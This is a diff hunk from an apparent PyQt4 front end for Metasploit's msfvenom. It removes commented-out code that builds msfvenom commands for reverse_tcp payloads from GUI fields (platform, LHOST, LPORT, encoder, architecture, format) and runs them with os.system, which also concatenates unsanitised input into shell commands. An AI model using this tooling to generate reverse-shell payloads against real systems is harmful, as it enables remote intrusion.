@@ -570,24 +570,6 @@ try:
 		msf.Application00()
 except ImportError:
     print ("Please install PyQt4\n\tPlease write python install.py")
-############################################################################################
-#currentText()
-#os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -a "+str(self.arch.currentText())+" -e "+str(self.encoder.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text()))                                                                                     
-#setCurrentIndex()
-#if self.encoder.currentText() == "none":
-#				if self.arch.currentText() == "none":
-#					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))
-#			elif self.arch.currentText() == "none":
-#				os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))			elif self.encoder.currentText() == "none":
-#				os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -a "+str(self.arch.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))
-#			else:
-#				os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -a "+str(self.arch.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))
-				
-
-
-
-
-
 
 
 
